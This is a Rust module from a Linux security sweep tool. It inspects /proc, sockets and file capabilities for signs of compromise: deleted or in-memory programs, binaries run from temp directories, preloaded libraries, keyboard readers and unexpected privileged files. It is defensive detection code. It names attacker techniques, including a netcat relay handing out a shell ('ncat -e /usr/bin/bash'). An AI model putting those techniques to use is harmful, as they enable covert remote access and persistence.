//! The sweep's live checks: what is running now, the way Objective-See's
//! process, network, keyboard, camera and kernel-extension viewers look at a
//! Mac.
//!
//! Only what does not add up is listed, so a clean system shows nothing:
//! a running program with no file on disk, or running from a temporary or
//! cache directory; a library no package installed preloaded into a
//! program; a program that listens on the network with nothing installed
//! to account for it, or that reads the keyboard or uses a camera and that
//! no repository package installed; a loaded kernel module no package
//! installed; and setuid, setgid or capability files no package vouches
//! for. Everything is read from `/proc`, `/sys`, `modules.dep` and file
//! modes; nothing found is run. As a user only the user's own processes
//! can be inspected, so the root collector runs these checks too.
//!
//! - `net` looks at sockets: who listens, shells whose input and output
//!   are a connection, tools that relay, and raw packet sockets.
//! - `kernel` looks for what hides: processes and modules missing from the
//!   kernel's own lists, and who is attached to whom.
//! - `files` checks the files the other checks vouch for by their path
//!   against what their package recorded, and looks through the
//!   directories programs and libraries are loaded from.

mod files;
mod kernel;
mod net;

use std::collections::{BTreeMap, HashMap};
use std::ffi::OsString;
use std::fs;
use std::io;
use std::os::fd::AsRawFd;
use std::os::unix::fs::MetadataExt;
use std::path::Path;
use std::process::ExitStatus;

use super::collect::{self, Body, Item, Origin, Scope};
use super::programs::{is_interpreter, is_netcat, script_arguments};
use super::read::{self, View};
use super::tier::Tier;
use crate::autorun::Category;
use crate::paths::file_name;
use crate::rules::RuleId;
use crate::tools::{self, Limits};

const GETCAP: &str = "/usr/bin/getcap";
/// Where setuid and capability files are looked for.
/// The home directories last: they hold the most files, and the walk stops
/// at a limit.
const PRIVILEGED_ROOTS: &[&str] = &["usr", "opt", "etc", "var", "srv", "root", "home"];
/// Under those, what holds other systems' files (containers, snapshots).
const PRIVILEGED_SKIPPED: &[&str] = &[
    "var/lib/docker",
    "var/lib/containers",
    "var/lib/machines",
    "var/lib/flatpak",
    "var/cache",
];
/// Capabilities that amount to root, or to reading or changing what only
/// root may. The others are reported one step lower.
const ROOT_CAPABILITIES: &[&str] = &[
    "cap_setuid",
    "cap_setgid",
    "cap_sys_admin",
    "cap_sys_ptrace",
    "cap_sys_module",
    "cap_dac_override",
    "cap_dac_read_search",
    "cap_chown",
    "cap_fowner",
    "cap_sys_rawio",
    "cap_setfcap",
    "cap_setpcap",
    "cap_mknod",
    "cap_bpf",
    "cap_sys_boot",
    "cap_sys_chroot",
    "cap_mac_admin",
    "cap_mac_override",
    "cap_linux_immutable",
    "cap_net_admin",
];
/// Every other capability the kernel has a name for. One that is in
/// neither list (a number, a newer kernel's) is judged like a root one.
const OTHER_CAPABILITIES: &[&str] = &[
    "cap_fsetid",
    "cap_kill",
    "cap_net_bind_service",
    "cap_net_broadcast",
    "cap_net_raw",
    "cap_ipc_lock",
    "cap_ipc_owner",
    "cap_sys_pacct",
    "cap_sys_nice",
    "cap_sys_resource",
    "cap_sys_time",
    "cap_sys_tty_config",
    "cap_lease",
    "cap_audit_write",
    "cap_audit_control",
    "cap_audit_read",
    "cap_syslog",
    "cap_wake_alarm",
    "cap_block_suspend",
    "cap_perfmon",
    "cap_checkpoint_restore",
];
/// The capabilities repository packages give their own programs, in their
/// install steps or in the package itself, each list sorted. Pacman
/// records none of them, so any other capability on a packaged file was
/// set afterwards.
const EXPECTED_CAPABILITIES: &[(&str, &[&str])] = &[
    ("usr/bin/newuidmap", &["cap_setuid"]),
    ("usr/bin/newgidmap", &["cap_setgid"]),
    ("usr/bin/gsr-kms-server", &["cap_sys_admin"]),
    ("usr/bin/btop", &["cap_dac_read_search", "cap_perfmon"]),
    ("usr/bin/rcp", &["cap_net_bind_service"]),
    ("usr/bin/rlogin", &["cap_net_bind_service"]),
    ("usr/bin/rsh", &["cap_net_bind_service"]),
    ("usr/lib/gvfsd-nfs", &["cap_net_bind_service"]),
    (
        "usr/lib/gstreamer-1.0/gst-ptp-helper",
        &["cap_net_admin", "cap_net_bind_service"],
    ),
    ("usr/bin/ping", &["cap_net_raw"]),
    ("usr/bin/mtr-packet", &["cap_net_raw"]),
    ("usr/bin/fping", &["cap_net_raw"]),
    ("usr/bin/dumpcap", &["cap_net_admin", "cap_net_raw"]),
    ("usr/bin/nethogs", &["cap_net_admin", "cap_net_raw"]),
    ("usr/bin/gnome-keyring-daemon", &["cap_ipc_lock"]),
    ("usr/bin/kwin_wayland", &["cap_sys_nice"]),
    ("usr/bin/gamescope", &["cap_sys_nice"]),
    ("usr/bin/intel_gpu_top", &["cap_perfmon"]),
];
/// Entries the privileged-file walk looks at before it stops and says so.
const MAX_WALK: usize = 2_000_000;
/// Notes kept per item: one program can run as many processes.
const MAX_NOTES: usize = 3;
/// Directories downloads and droppers land in.
const TEMPORARY: &[&str] = &["tmp/", "var/tmp/", "dev/shm/", "run/user/"];

/// What the live checks found.
#[derive(Debug, Default)]
pub struct Live {
    pub items: Vec<Item>,
    pub notes: Vec<String>,
    /// What was not looked at, each as a sentence (see
    /// `Collection::truncated`).
    pub unchecked: Vec<String>,
}

/// What a process's `status` says of it.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
struct Status {
    /// Its short name (`comm`), which it sets itself.
    name: String,
    /// The process it is a thread of; its own number for a process.
    group: u32,
    parent: u32,
    /// The process attached to it the way a debugger is, or 0.
    tracer: u32,
    /// Root's in every respect: its real, effective, saved and filesystem
    /// user.
    of_root: bool,
}

/// Every process the kernel lists, whoever it belongs to.
struct Listed {
    pid: u32,
    status: Status,
    /// The name it was started under (its first argument); none for a
    /// kernel thread.
    started_as: Option<String>,
}

/// A running process, as far as it can be read.
#[derive(Default)]
struct Process {
    pid: String,
    /// The `exe` link's text (`/usr/bin/x`, `/x (deleted)`, `/memfd:y`).
    exe: String,
    /// The device and inode of the file the process really runs.
    exe_id: Option<(u64, u64)>,
    /// The file it runs has no name left: it was deleted or replaced. The
    /// link's text alone does not say, since a file may be called
    /// `x (deleted)`.
    deleted: bool,
    arguments: Vec<String>,
    /// Its open files: each descriptor's number and where it leads.
    fds: Vec<(u32, String)>,
    environment: Option<Vec<u8>>,
    /// Its working directory, relative to `/`: what a script given by a
    /// relative name is relative to.
    cwd: Option<String>,
    /// It runs in a user namespace of its own, where it can mount what it
    /// likes over any path: the name of its program vouches for nothing.
    own_namespace: bool,
    /// Root's own process: nobody else chose what it is called.
    of_root: bool,
    /// Its control group (`/system.slice/sshd.service`), which names the
    /// unit that started it.
    cgroup: String,
    /// Its network namespace, where that is not the sweep's own.
    network: Option<String>,
}

/// What the kernel appends to the name of a program whose file is gone.
const DELETED: &str = " (deleted)";

impl Process {
    /// Its program's path relative to `/`, without the mark of a deleted
    /// file.
    fn path(&self) -> &str {
        let exe = self.exe.trim_start_matches('/');
        if self.deleted {
            exe.strip_suffix(DELETED).unwrap_or(exe)
        } else {
            exe
        }
    }

    /// Its program's file name.
    fn name(&self) -> &str {
        let path = self.path();
        file_name(path)
    }

    /// Its number.
    fn number(&self) -> u32 {
        self.pid.parse().unwrap_or(0)
    }

    /// Where descriptor `number` leads.
    fn fd(&self, number: u32) -> Option<&str> {
        self.fds
            .iter()
            .find(|(fd, _)| *fd == number)
            .map(|(_, target)| target.as_str())
    }

    /// Whether its input is a terminal: somebody typed its command.
    fn on_terminal(&self) -> bool {
        self.fd(0)
            .is_some_and(|target| target.starts_with("/dev/pts/") || target.starts_with("/dev/tty"))
    }

    /// How it was started, shortened.
    fn started(&self) -> String {
        self.arguments
            .iter()
            .take(4)
            .map(String::as_str)
            .collect::<Vec<_>>()
            .join(" ")
    }
}

/// Runs every live check against `scope` (its root holds `proc`).
pub fn check(scope: &Scope<'_>) -> Live {
    let mut found = Found::default();
    let running = processes(&scope.root.join("proc"));
    if let Some(reason) = &running.unlistable {
        found.not_checked(
            scope,
            format!("/proc: could not be listed ({reason}); running processes were not checked"),
        );
    }
    // As a user that is what root's checks are for. Root has nothing
    // behind it to cover them: a process root cannot look at is one that
    // something keeps from it.
    if running.unreadable > 0 {
        let hidden = running.unreadable;
        if scope.origin == Origin::Root {
            found.add_missing(
                scope,
                Category::Process,
                "proc",
                "processes root cannot read",
                format!("{hidden} running process(es) could not be looked at, even as root"),
                RuleId::RootkitSign,
            );
        } else {
            found.notes.push(format!(
                "{hidden} running process(es) of other users could not be looked at; the root checks cover them"
            ));
        }
    }
    for process in &running.processes {
        program_checks(scope, process, &mut found);
    }
    net::check(scope, &running, &mut found);
    kernel(scope, &mut found);
    kernel::check(scope, &running, &mut found);
    privileged_files(scope, &mut found);
    files::check(scope, &mut found);
    files::say_what_was_cut(scope, &mut found);
    Live {
        items: found.items.into_values().collect(),
        notes: found.notes,
        unchecked: found.unchecked,
    }
}

#[derive(Default)]
struct Found {
    items: BTreeMap<String, Item>,
    notes: Vec<String>,
    unchecked: Vec<String>,
    /// Packaged files compared with what their package recorded, and
    /// whether each is still that (see `files::intact`).
    verified: HashMap<String, bool>,
    /// The bytes read for those comparisons, and whether some were left
    /// out to stay within the bound.
    hashed: u64,
    cut_short: bool,
}

/// What reading one of the kernel's own files or directories gave.
enum Source<T> {
    Read(T),
    /// It is not there: a kernel without it, or a test tree.
    Absent,
    /// It is there and could not be read, and why.
    Unreadable(String),
}

/// Tells a source that is not there from one that could not be read:
/// only the first has nothing in it.
fn source<T>(read: io::Result<T>) -> Source<T> {
    match read {
        Ok(read) => Source::Read(read),
        Err(error) if error.kind() == io::ErrorKind::NotFound => Source::Absent,
        Err(error) => Source::Unreadable(error.to_string()),
    }
}

impl Found {
    /// Says what could not be looked at: for the root checks, which
    /// nothing stands behind, something left unchecked; a note in a user's
    /// sweep.
    fn not_checked(&mut self, scope: &Scope<'_>, sentence: String) {
        if scope.origin == Origin::Root {
            self.unchecked.push(sentence);
        } else {
            self.notes.push(sentence);
        }
    }

    /// What `read` gave of the source called `name`. Nothing where it is
    /// not there; nothing either where it is there and could not be read,
    /// which is said once, with what was `missed` for it.
    fn read<T>(
        &mut self,
        scope: &Scope<'_>,
        name: &str,
        missed: &str,
        read: io::Result<T>,
    ) -> Option<T> {
        match source(read) {
            Source::Read(read) => Some(read),
            Source::Absent => None,
            Source::Unreadable(reason) => {
                self.not_checked(
                    scope,
                    format!("{name}: could not be read ({reason}); {missed}"),
                );
                None
            }
        }
    }

    /// Adds what was seen about the file at `path`; one item per path.
    fn add(
        &mut self,
        scope: &Scope<'_>,
        category: Category,
        path: &str,
        note: String,
        alert: Option<RuleId>,
    ) {
        self.add_as(scope, category, path, path, note, alert);
    }

    /// Adds what was seen about the file at `path` as the item `name`: the
    /// path, or the path and what it was seen doing
    /// (`usr/bin/python3:tcp-8000`). Allowing an item allows that name, so
    /// a program allowed to listen on one port is shown again when it
    /// listens on another.
    fn add_as(
        &mut self,
        scope: &Scope<'_>,
        category: Category,
        name: &str,
        path: &str,
        note: String,
        alert: Option<RuleId>,
    ) {
        let item = self
            .items
            .entry(name.to_string())
            .or_insert_with(|| collect::item_named(scope, category, name, path));
        push_note(item, note.clone());
        if let Some(rule) = alert
            && !item.alerts.iter().any(|(existing, _)| *existing == rule)
        {
            item.alerts.push((rule, note));
        }
    }

    /// Adds something with no file to look at (a deleted program, a module
    /// loaded from nowhere).
    fn add_missing(
        &mut self,
        scope: &Scope<'_>,
        category: Category,
        path: &str,
        reason: &str,
        note: String,
        rule: RuleId,
    ) {
        let item = self.items.entry(path.to_string()).or_insert_with(|| Item {
            file: None,
            origin: scope.origin,
            category,
            path: path.to_string(),
            tier: Tier::Unknown,
            sha256: None,
            body: Body::Unreadable(reason.to_string()),
            runs: Vec::new(),
            run_by: None,
            notes: Vec::new(),
            alerts: Vec::new(),
        });
        push_note(item, note.clone());
        if !item.alerts.iter().any(|(existing, _)| *existing == rule) {
            item.alerts.push((rule, note));
        }
    }
}

fn push_note(item: &mut Item, note: String) {
    if item.notes.len() < MAX_NOTES {
        item.notes.push(note);
    } else if item.notes.len() == MAX_NOTES {
        item.notes.push("and more".into());
    }
}

/// `text` as part of an item's name: plain characters only, and not long,
/// since the name is typed to allow the item.
fn plain(text: &str) -> String {
    let plain: String = text
        .chars()
        .take(40)
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
                c
            } else {
                '_'
            }
        })
        .collect();
    // A name of dots alone would read as a directory.
    if plain.chars().all(|c| c == '.') {
        "_".into()
    } else {
        plain
    }
}

/// Whether a repository package installed the file at `path`.
fn packaged(scope: &Scope<'_>, path: &str) -> bool {
    scope
        .index
        .owner(path)
        .is_some_and(|owned| !scope.index.is_foreign(scope.index.package(owned)))
}

/// The processes of a system: those whose program can be read, every one
/// the kernel lists, and how many could not be read.
#[derive(Default)]
struct Running {
    processes: Vec<Process>,
    listed: Vec<Listed>,
    unreadable: usize,
    /// Why the list of processes itself could not be read, where it is
    /// there: nothing above says anything of what runs then.
    unlistable: Option<String>,
}

/// Every process under `proc`.
fn processes(proc: &Path) -> Running {
    let listing = match source(fs::read_dir(proc)) {
        Source::Read(listing) => listing,
        Source::Absent => return Running::default(),
        Source::Unreadable(reason) => {
            return Running {
                unlistable: Some(reason),
                ..Running::default()
            };
        }
    };
    let mut running = Running::default();
    let link = |path: &Path| fs::read_link(path).ok();
    let ours = link(&proc.join("self/ns/user"));
    let our_network = link(&proc.join("self/ns/net"));
    for entry in listing.filter_map(Result::ok) {
        let Some(pid) = entry.file_name().to_str().map(str::to_string) else {
            continue;
        };
        let Ok(number) = pid.parse::<u32>() else {
            continue;
        };
        let directory = entry.path();
        // Asked before and after the rest is read: a process number may
        // pass to another process in between.
        let before = status(&directory);
        let arguments: Vec<String> = fs::read(directory.join("cmdline"))
            .map(|bytes| {
                bytes
                    .split(|byte| *byte == 0)
                    .filter(|argument| !argument.is_empty())
                    .map(|argument| String::from_utf8_lossy(argument).into_owned())
                    .collect()
            })
            .unwrap_or_default();
        running.listed.push(Listed {
            pid: number,
            status: before.clone(),
            started_as: arguments.first().cloned(),
        });
        let exe = match fs::read_link(directory.join("exe")) {
            Ok(exe) => exe.to_string_lossy().into_owned(),
            Err(error) if error.kind() == io::ErrorKind::PermissionDenied => {
                running.unreadable += 1;
                continue;
            }
            // Kernel threads have no program; a process may have exited.
            Err(_) => continue,
        };
        let running_file = fs::metadata(directory.join("exe")).ok();
        // Unreadable for a process (an old kernel, a test tree) counts as
        // ours.
        let own_namespace =
            link(&directory.join("ns/user")).is_some_and(|theirs| ours.as_ref() != Some(&theirs));
        running.processes.push(Process {
            pid,
            deleted: is_deleted(&exe, running_file.as_ref()),
            exe,
            exe_id: running_file.map(|metadata| (metadata.dev(), metadata.ino())),
            arguments,
            fds: descriptors(&directory),
            environment: fs::read(directory.join("environ")).ok(),
            cwd: link(&directory.join("cwd")).and_then(|cwd| {
                cwd.to_str()
                    .map(|cwd| cwd.trim_start_matches('/').to_string())
            }),
            own_namespace,
            of_root: before.of_root && status(&directory).of_root,
            cgroup: cgroup(&directory),
            network: link(&directory.join("ns/net"))
                .filter(|theirs| our_network.as_ref() != Some(theirs))
                .map(|theirs| theirs.to_string_lossy().into_owned()),
        });
    }
    running
        .processes
        .sort_by(|left, right| left.pid.cmp(&right.pid));
    running
}

/// The open files of the process at `directory`.
fn descriptors(directory: &Path) -> Vec<(u32, String)> {
    let Ok(fds) = fs::read_dir(directory.join("fd")) else {
        return Vec::new();
    };
    let mut fds: Vec<(u32, String)> = fds
        .filter_map(Result::ok)
        .filter_map(|fd| {
            let number = fd.file_name().to_str()?.parse().ok()?;
            let target = fs::read_link(fd.path()).ok()?;
            Some((number, target.to_string_lossy().into_owned()))
        })
        .collect();
    fds.sort();
    fds
}

/// The control group of the process at `directory`, from its `cgroup`
/// (`0::/system.slice/sshd.service`).
fn cgroup(directory: &Path) -> String {
    fs::read_to_string(directory.join("cgroup"))
        .unwrap_or_default()
        .lines()
        .find_map(|line| line.strip_prefix("0::"))
        .unwrap_or_default()
        .to_string()
}

/// Whether the program a process runs was deleted: its `exe` link says so
/// and the file it leads to has no name left. A file with a name left is
/// either one that is really called `x (deleted)`, which is then the very
/// file at that path, or one deleted under this name and kept under
/// another.
fn is_deleted(exe: &str, running: Option<&fs::Metadata>) -> bool {
    if !exe.ends_with(DELETED) {
        return false;
    }
    match running {
        // The link leads to nothing that can be asked: its text is all
        // there is.
        None => true,
        Some(running) if running.nlink() == 0 => true,
        Some(running) => !fs::metadata(exe)
            .is_ok_and(|named| named.dev() == running.dev() && named.ino() == running.ino()),
    }
}

/// What the `status` of the process at `directory` says.
fn status(directory: &Path) -> Status {
    parse_status(&fs::read_to_string(directory.join("status")).unwrap_or_default())
}

fn parse_status(text: &str) -> Status {
    let field = |name: &str| {
        text.lines()
            .find_map(|line| line.strip_prefix(name))
            .map(str::trim)
    };
    let number = |name: &str| {
        field(name)
            .and_then(|value| value.split_whitespace().next())
            .and_then(|value| value.parse().ok())
            .unwrap_or(0)
    };
    Status {
        name: field("Name:").unwrap_or_default().to_string(),
        group: number("Tgid:"),
        parent: number("PPid:"),
        tracer: number("TracerPid:"),
        of_root: field("Uid:").is_some_and(|ids| {
            let mut ids = ids.split_whitespace().peekable();
            ids.peek().is_some() && ids.all(|id| id == "0")
        }),
    }
}

/// Whether the process at `directory` is root's in every respect (the
/// real, effective, saved and filesystem user of its `status`). Who owns
/// its `/proc` directory does not say: that is root for any process that
/// made itself undumpable, where `/proc` hides other users' processes.
#[cfg(test)]
fn of_root(directory: &Path) -> bool {
    status(directory).of_root
}

/// Whether `process` runs a repository package's program and nothing else:
/// the file at its path is the very file it runs (a bind mount or rename
/// cannot borrow a packaged name), it is what the package installed, and
/// it is not an interpreter.
fn trusted_program(scope: &Scope<'_>, process: &Process, exe: &str, found: &mut Found) -> bool {
    if !packaged(scope, exe) || is_interpreter(exe) || replaced_in_own_namespace(process) {
        return false;
    }
    if !files::intact(scope, found, Category::Process, exe) {
        return false;
    }
    if scope.root != Path::new("/") {
        return true;
    }
    let on_disk = fs::metadata(scope.root.join(exe))
        .ok()
        .map(|metadata| (metadata.dev(), metadata.ino()));
    on_disk.is_some() && on_disk == process.exe_id
}

/// Whether `process` runs a deleted program in a user namespace of its
/// own. An update leaves the old program running under its name, which is
/// fine; so does binding a directory of one's own over `/usr/bin` in such a
/// namespace, running a program from it and deleting it, and the name is
/// then a packaged one the program never came from.
fn replaced_in_own_namespace(process: &Process) -> bool {
    process.own_namespace && process.deleted
}

/// Whether there is a file now where the deleted program of `process`
/// was. In a mount namespace of its own a process gives its program any
/// name, a root-only path included: whether a file is there is asked as
/// anyone could ask it, unless the process is root's.
fn is_replaced(scope: &Scope<'_>, process: &Process) -> bool {
    let path = process.path();
    if process.of_root {
        scope.root.join(path).is_file()
    } else {
        collect::is_file_there(scope, path, None)
    }
}

/// Whether `process` runs the older copy of a packaged program that an
/// update replaced while it runs: nothing to report. Only a package's own
/// path counts. Anywhere else a file at the path of a deleted program says
/// nothing about that program: whoever deleted it may have put it there.
fn is_updated(scope: &Scope<'_>, process: &Process) -> bool {
    process.deleted
        && !process.own_namespace
        && packaged(scope, process.path())
        && is_replaced(scope, process)
}

/// The files on disk an interpreter (or the loader) may be running as its
/// script, most likely first; none for a program that is not one, and for
/// a relay, which runs what it is told (`ncat -e /usr/bin/bash`), not a
/// script.
fn scripts(scope: &Scope<'_>, process: &Process, exe: &str) -> Vec<String> {
    let relay = is_netcat(file_name(exe));
    if !is_interpreter(exe) || relay {
        return Vec::new();
    }
    script_arguments(&process.arguments)
        .into_iter()
        .filter_map(|script| match script.strip_prefix('/') {
            Some(absolute) => normalize(absolute),
            // A relative name is relative to where the process runs.
            None => normalize(&format!("{}/{script}", process.cwd.as_deref()?)),
        })
        .filter(|script| collect::is_file_there(scope, script, None))
        .collect()
}

/// What to name for an untrusted process: the script an interpreter runs,
/// if there is one on disk, else the program; and how it was started.
fn subject(scope: &Scope<'_>, process: &Process, exe: &str) -> (String, String) {
    let started = process.started();
    // Where an option's value may stand before the script, the file no
    // package vouches for is the one to name: a packaged file given as
    // that value must not take the script's place.
    let scripts = scripts(scope, process, exe);
    if let Some(script) = scripts
        .iter()
        .find(|script| !packaged(scope, script))
        .or_else(|| scripts.first())
    {
        return (script.clone(), started);
    }
    (exe.to_string(), started)
}

/// What an interpreter with no script on disk was told to run, as part of
/// an item's name: the module or the first argument (`http.server`), or a
/// mark of the code it was handed (`python3 -c …`), so that one such
/// process allowed does not allow the next. Nothing for a program that is
/// not an interpreter or was given nothing.
fn told(process: &Process, exe: &str) -> Option<String> {
    if !is_interpreter(exe) {
        return None;
    }
    let first = script_arguments(&process.arguments).into_iter().next()?;
    // Code is long and holds anything: its hash names it.
    let code = first.len() > 40 || first.contains(char::is_whitespace);
    Some(if code {
        let digest = crate::sha256::Sha256::digest(first.as_bytes()).to_string();
        format!("code-{}", &digest[..12])
    } else {
        plain(first)
    })
}

/// The module a Python process was told to run (`python3 -m http.server`),
/// and where Python finds it.
#[derive(Debug, PartialEq, Eq)]
struct Module {
    name: String,
    /// The file Python runs for it, relative to the root, where that is
    /// certain.
    file: Option<String>,
    /// That file is in the directory the process was started in, and the
    /// interpreter's own library has a module of the same name.
    shadows: bool,
}

/// The name after `-m` on a Python command line (also `-um`, `-Im`), if it
/// comes before any script.
fn module_argument(arguments: &[String]) -> Option<&str> {
    let mut arguments = arguments.iter().skip(1).map(String::as_str);
    while let Some(argument) = arguments.next() {
        if !argument.starts_with('-') || argument == "-" || argument == "-c" {
            return None;
        }
        if !argument.starts_with("--") && argument.ends_with('m') {
            return arguments.next();
        }
    }
    None
}

/// The directory of the standard library of the Python at `exe`
/// (`usr/lib/python3.14` for `usr/bin/python3.14`, or for `usr/bin/python3`
/// where that is a link to it).
fn python_library(scope: &Scope<'_>, exe: &str) -> Option<String> {
    let versioned = |name: &str| {
        name.strip_prefix("python3.")
            .filter(|minor| !minor.is_empty() && minor.chars().all(|c| c.is_ascii_digit()))
            .map(|_| format!("usr/lib/{name}"))
    };
    let name = exe.strip_prefix("usr/bin/")?;
    versioned(name).or_else(|| {
        let target = fs::read_link(scope.root.join(exe)).ok()?;
        versioned(target.to_str()?)
    })
}

/// The module `process`, a Python at `exe`, was told to run, with the file
/// it is: looked for as Python does, first in the directory the process
/// was started in, then in the interpreter's own library and the packages
/// installed beside it. Where that cannot be told for certain (a search
/// path of the process's own, a virtual environment, a package in the
/// started-in directory that holds only part of the name), no file is
/// named.
fn module_of(scope: &Scope<'_>, process: &Process, exe: &str) -> Option<Module> {
    let name = file_name(exe);
    if !["python", "pypy"]
        .iter()
        .any(|python| name.starts_with(python))
    {
        return None;
    }
    let module = module_argument(&process.arguments)?;
    let plain_name = !module.is_empty()
        && module.split('.').all(|part| {
            !part.is_empty() && part.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        });
    let unresolved = || Module {
        name: module.to_string(),
        file: None,
        shadows: false,
    };
    if !plain_name {
        return Some(unresolved());
    }
    let relative = module.replace('.', "/");
    let there = |path: &str| collect::is_file_there(scope, path, None);
    let found_in = |directory: &str| {
        [
            format!("{directory}/{relative}/__main__.py"),
            format!("{directory}/{relative}.py"),
        ]
        .into_iter()
        .filter_map(|path| normalize(&path))
        .find(|path| there(path))
    };
    let own_search_path = process.environment.as_deref().is_some_and(|environment| {
        environment.split(|byte| *byte == 0).any(|entry| {
            entry.starts_with(b"PYTHONPATH=")
                || entry.starts_with(b"PYTHONHOME=")
                || entry.starts_with(b"VIRTUAL_ENV=")
        })
    });
    let library = python_library(scope, exe).filter(|_| !own_search_path);
    let packaged = library.as_deref().and_then(|library| {
        found_in(library).or_else(|| found_in(&format!("{library}/site-packages")))
    });
    let Some(cwd) = process.cwd.as_deref() else {
        return Some(unresolved());
    };
    if let Some(local) = found_in(cwd) {
        return Some(Module {
            name: module.to_string(),
            file: Some(local),
            shadows: packaged.is_some(),
        });
    }
    // Anything else of the module's first name where the process was
    // started may take its place in ways not followed here.
    // The directory is the process's choice: where root may not look into
    // it as everyone may, nothing is resolved, so that a module's file
    // being named or not says nothing of what the directory holds.
    let top = module.split('.').next().unwrap_or(module);
    let mut in_the_way = false;
    for name in [top.to_string(), format!("{top}.py")] {
        match collect::holds(scope, cwd, &name, None) {
            Some(held) => in_the_way |= held,
            None => return Some(unresolved()),
        }
    }
    Some(Module {
        name: module.to_string(),
        file: packaged.filter(|_| !in_the_way),
        shadows: false,
    })
}

/// A mark of the directory a process was started in, as part of an item's
/// name: what `python3 -m name` runs depends on it.
fn started_in(process: &Process) -> Option<String> {
    let cwd = process.cwd.as_deref()?;
    let digest = crate::sha256::Sha256::digest(cwd.as_bytes()).to_string();
    Some(format!("cwd-{}", &digest[..12]))
}

/// The checks on one process: its program, what it preloads, and whether
/// it reads the keyboard or uses a camera.
fn program_checks(scope: &Scope<'_>, process: &Process, found: &mut Found) {
    let pid = &process.pid;
    let exe = process.path();
    if exe.starts_with("memfd:") {
        found.add_missing(
            scope,
            Category::Process,
            exe,
            "runs only in memory",
            format!("process {pid} runs a program that exists only in memory"),
            RuleId::HiddenProgram,
        );
        return;
    }
    if process.deleted {
        deleted_checks(scope, process, exe, found);
        return;
    }
    temporary_checks(scope, process, exe, found);
    preload_checks(scope, process, exe, found);
    if trusted_program(scope, process, exe, found) {
        return;
    }
    device_checks(scope, process, exe, found);
}

/// The checks on a process whose program, once at `path`, was deleted.
fn deleted_checks(scope: &Scope<'_>, process: &Process, path: &str, found: &mut Found) {
    let pid = &process.pid;
    let there = is_replaced(scope, process);
    if there && replaced_in_own_namespace(process) {
        // Nothing says this is the program of that name: it is checked
        // like one no package vouches for.
        found.add(
            scope,
            Category::Process,
            path,
            format!(
                "process {pid} runs a deleted program under the name /{path}, in a user namespace of its own"
            ),
            None,
        );
        preload_checks(scope, process, path, found);
        device_checks(scope, process, path, found);
        return;
    }
    if is_updated(scope, process) {
        // An update replaced it while it runs. What is there now is still
        // checked against its package, and what was loaded into the
        // process is as telling as for any other.
        files::intact(scope, found, Category::Process, path);
        preload_checks(scope, process, path, found);
        return;
    }
    // Anything else runs a program that is no longer on disk, whatever is
    // at its path now: a file put there afterwards is not what runs, and
    // must not pass for it.
    let note = if there {
        format!(
            "process {pid} runs a program deleted from /{path}; the file there now is another one"
        )
    } else {
        format!("process {pid} runs /{path}, which was deleted")
    };
    found.add_missing(
        scope,
        Category::Process,
        path,
        "deleted while it runs",
        note,
        RuleId::HiddenProgram,
    );
    temporary_checks(scope, process, path, found);
    preload_checks(scope, process, path, found);
    device_checks(scope, process, path, found);
}

/// Whether an untrusted process reads the keyboard or uses a camera.
fn device_checks(scope: &Scope<'_>, process: &Process, exe: &str, found: &mut Found) {
    let pid = &process.pid;
    let (path, started) = subject(scope, process, exe);
    if process.fds.iter().any(|(_, fd)| reads_keys(scope, fd)) {
        found.add(
            scope,
            Category::Input,
            &path,
            format!("process {pid} ({started}) reads the keyboard device"),
            Some(RuleId::KeyboardReader),
        );
    }
    if let Some((_, camera)) = process
        .fds
        .iter()
        .find(|(_, fd)| fd.starts_with("/dev/video"))
    {
        found.add(
            scope,
            Category::Camera,
            &path,
            format!("process {pid} ({started}) has {camera} open"),
            None,
        );
    }
}

/// Whether `path` is in a temporary or cache directory.
fn is_temporary(scope: &Scope<'_>, path: &str) -> bool {
    TEMPORARY
        .iter()
        .any(|directory| path.starts_with(directory))
        || scope
            .home
            .is_some_and(|home| path.starts_with(&format!("{home}/.cache/")))
}

fn temporary_checks(scope: &Scope<'_>, process: &Process, exe: &str, found: &mut Found) {
    let pid = &process.pid;
    if !is_temporary(scope, exe) {
        // An interpreter is as trustworthy as the script it runs.
        let started = subject(scope, process, exe).1;
        for script in scripts(scope, process, exe) {
            if !is_temporary(scope, &script) {
                continue;
            }
            // An AppImage's own start script, under its mount.
            let appimage = script.starts_with("tmp/.mount_");
            let note = if appimage {
                format!("process {pid} ({started}) runs this script from an AppImage")
            } else {
                format!(
                    "process {pid} ({started}) runs this script from a temporary or cache directory"
                )
            };
            found.add(
                scope,
                Category::Process,
                &script,
                note,
                (!appimage).then_some(RuleId::RunningFromTemp),
            );
        }
        return;
    }
    // An AppImage runs from its own mount under /tmp.
    if exe.starts_with("tmp/.mount_") {
        found.add(
            scope,
            Category::Process,
            exe,
            format!("process {pid} runs from an AppImage"),
            None,
        );
    } else {
        found.add(
            scope,
            Category::Process,
            exe,
            format!("process {pid} runs from a temporary or cache directory"),
            Some(RuleId::RunningFromTemp),
        );
    }
}

fn preload_checks(scope: &Scope<'_>, process: &Process, exe: &str, found: &mut Found) {
    let pid = &process.pid;
    for directory in searched(process.environment.as_deref()) {
        // An AppImage adds its own mount under /tmp.
        let suspect = match &directory {
            Some(directory) => {
                is_temporary(scope, &format!("{directory}/"))
                    && !directory.starts_with("tmp/.mount_")
            }
            None => true,
        };
        if suspect {
            let shown = directory.map_or_else(
                || "a directory relative to where it runs".to_string(),
                |directory| format!("/{directory}"),
            );
            found.add(
                scope,
                Category::Process,
                exe,
                format!("process {pid} looks for its libraries in {shown} first (LD_LIBRARY_PATH)"),
                Some(RuleId::PreloadedLibrary),
            );
        }
    }
    for library in preloaded(process.environment.as_deref()) {
        match library {
            // A packaged library is trusted for what its package
            // installed, not for its path.
            Preload::Path(library)
                if !packaged(scope, &library)
                    || !files::intact(scope, found, Category::Process, &library) =>
            {
                // Steam's overlay preloads itself into every game.
                let overlay =
                    library.contains("/.local/share/Steam/") || library.contains("/.steam/");
                found.add(
                    scope,
                    Category::Process,
                    &library,
                    format!("preloaded into /{exe} (process {pid})"),
                    (!overlay).then_some(RuleId::PreloadedLibrary),
                );
            }
            Preload::Path(_) => {}
            Preload::Searched(name) => found.add(
                scope,
                Category::Process,
                exe,
                format!("process {pid} preloads {name:?}, found through the library search path"),
                Some(RuleId::PreloadedLibrary),
            ),
        }
    }
}

/// Whether open file `fd` is an input device with letter keys (a keyboard,
/// not a game controller). Unknown devices count as keyboards.
